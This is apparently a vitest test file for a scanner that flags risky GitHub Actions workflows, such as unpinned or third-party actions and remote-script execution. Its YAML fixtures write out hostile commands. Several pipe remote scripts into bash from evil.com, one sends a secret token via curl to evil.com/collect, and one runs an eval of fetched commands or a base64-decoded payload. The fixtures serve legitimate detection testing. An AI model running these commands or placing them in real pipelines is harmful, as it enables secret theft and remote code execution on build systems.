import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import { scanGitHubActionsWorkflows } from "../github-actions-scanner.js";

/**
 * Helper: create a temp directory with .github/workflows/ structure
 * and write workflow files into it.
 */
function createWorkflowDir(
  baseDir: string,
  workflows: Record<string, string>,
): void {
  const workflowDir = path.join(baseDir, ".github", "workflows");
  fs.mkdirSync(workflowDir, { recursive: true });

  for (const [name, content] of Object.entries(workflows)) {
    fs.writeFileSync(path.join(workflowDir, name), content);
  }
}

describe("GitHub Actions Workflow Scanner", () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join("/tmp", "scg-gha-test-"));
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  it("should return no findings for a clean workflow", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npm test
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    // Only expect info/low findings for well-known actions with version tags
    const highOrAbove = findings.filter(
      (f) => f.severity === "high" || f.severity === "critical",
    );
    expect(highOrAbove).toHaveLength(0);
  });

  it("should return empty findings when no .github/workflows directory exists", () => {
    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings).toHaveLength(0);
  });

  // -- Remote content piped to shell --

  it("should detect curl piped to bash", () => {
    createWorkflowDir(tempDir, {
      "setup.yml": `
name: Setup
on: push
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://example.com/install.sh | bash
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_CURL_PIPE_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
    expect(finding?.file).toContain("setup.yml");
  });

  it("should detect wget piped to sh", () => {
    createWorkflowDir(tempDir, {
      "setup.yml": `
name: Setup
on: push
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - run: wget -qO- https://example.com/setup.sh | sh
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_WGET_PIPE_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
  });

  it("should detect curl download then execute pattern", () => {
    createWorkflowDir(tempDir, {
      "setup.yml": `
name: Setup
on: push
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - run: curl -o setup.sh https://evil.com/payload && bash setup.sh
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_CURL_DOWNLOAD_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
  });

  // -- Secrets exfiltration --

  it("should detect secrets sent via curl", () => {
    createWorkflowDir(tempDir, {
      "deploy.yml": `
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: curl -H "Authorization: $\{{ secrets.API_KEY }}" https://evil.com/collect
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_SECRET_CURL");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
  });

  it("should detect secrets exfiltration with curl preceding secret ref", () => {
    createWorkflowDir(tempDir, {
      "deploy.yml": `
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: |
          $\{{ secrets.TOKEN }} && curl https://attacker.com/steal
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const secretFindings = findings.filter(
      (f) => f.rule === "GHA_SECRET_CURL" || f.rule === "GHA_SECRET_EXFIL_MULTILINE",
    );
    expect(secretFindings.length).toBeGreaterThan(0);
  });

  // -- Unpinned action versions --

  it("should detect unpinned action using @main", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/some-action@main
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_UNPINNED_ACTION");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("medium");
    expect(finding?.description).toContain("@main");
  });

  it("should detect unpinned action using @master", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/some-action@master
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_UNPINNED_ACTION");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("medium");
  });

  it("should not flag actions pinned to commit SHAs as unpinned", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const unpinned = findings.filter((f) => f.rule === "GHA_UNPINNED_ACTION");
    expect(unpinned).toHaveLength(0);
  });

  // -- Third-party actions --

  it("should flag third-party actions from untrusted owners", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: unknown-owner/suspicious-action@v1
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_THIRD_PARTY_ACTION");
    expect(finding).toBeDefined();
  });

  it("should not flag official GitHub actions as third-party", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - uses: github/codeql-action/init@v3
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const thirdParty = findings.filter(
      (f) => f.rule === "GHA_THIRD_PARTY_ACTION",
    );
    expect(thirdParty).toHaveLength(0);
  });

  // -- Base64 encoded payloads --

  it("should detect base64 encoded payloads decoded and executed", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Y3VybCBodHRwczovL2V2aWwuY29tL3BheWxvYWQgfCBiYXNo" | base64 -d | bash
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const b64Finding = findings.find(
      (f) => f.rule === "GHA_BASE64_PAYLOAD" || f.rule === "GHA_BASE64_EXEC",
    );
    expect(b64Finding).toBeDefined();
    expect(b64Finding?.severity).toBe("high");
  });

  it("should detect base64 --decode piped to shell", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: cat payload.txt | base64 --decode | node
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_BASE64_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
  });

  // -- eval in run blocks --

  it("should detect eval with command substitution", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: eval $(curl -s https://evil.com/commands)
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const evalFinding = findings.find(
      (f) => f.rule === "GHA_EVAL_SUBSHELL",
    );
    expect(evalFinding).toBeDefined();
    expect(evalFinding?.severity).toBe("high");
  });

  // -- Multiple workflow files --

  it("should scan multiple workflow files", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/action@main
`,
      "deploy.yml": `
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://evil.com/script | bash
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const ciFindings = findings.filter(
      (f) => f.file?.includes("ci.yml"),
    );
    const deployFindings = findings.filter(
      (f) => f.file?.includes("deploy.yml"),
    );
    expect(ciFindings.length).toBeGreaterThan(0);
    expect(deployFindings.length).toBeGreaterThan(0);
  });

  // -- .yaml extension support --

  it("should scan .yaml files in addition to .yml", () => {
    createWorkflowDir(tempDir, {
      "build.yaml": `
name: Build
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://example.com/install | bash
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_CURL_PIPE_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.file).toContain("build.yaml");
  });

  // -- Line number accuracy --

  it("should report correct line numbers", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
      - run: curl https://evil.com/payload | bash
      - run: echo done
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_CURL_PIPE_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.line).toBe(8);
  });

  // -- Non-workflow files are ignored --

  it("should ignore non-YAML files in workflows directory", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: npm test
`,
    });

    // Add a non-YAML file
    const workflowDir = path.join(tempDir, ".github", "workflows");
    fs.writeFileSync(
      path.join(workflowDir, "README.md"),
      "# Workflows\ncurl https://evil.com | bash",
    );

    const findings = scanGitHubActionsWorkflows(tempDir);
    const curlFindings = findings.filter(
      (f) => f.rule === "GHA_CURL_PIPE_EXEC",
    );
    expect(curlFindings).toHaveLength(0);
  });

  // -- Integration: used by main scanner --

  it("should detect multiple issues in a single workflow", () => {
    createWorkflowDir(tempDir, {
      "malicious.yml": `
name: Malicious
on: push
jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - uses: evil-org/backdoor@main
      - run: |
          curl -fsSL https://evil.com/stage1.sh | bash
          echo "c3RlYWwgc2VjcmV0cw==" | base64 -d | sh
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);

    // Should find unpinned action
    expect(findings.some((f) => f.rule === "GHA_UNPINNED_ACTION")).toBe(true);
    // Should find curl pipe exec
    expect(findings.some((f) => f.rule === "GHA_CURL_PIPE_EXEC")).toBe(true);
    // Should find base64 payload or exec
    expect(
      findings.some(
        (f) => f.rule === "GHA_BASE64_PAYLOAD" || f.rule === "GHA_BASE64_EXEC",
      ),
    ).toBe(true);
    // Should have third-party action finding
    expect(findings.some((f) => f.rule === "GHA_THIRD_PARTY_ACTION")).toBe(true);
  });
});
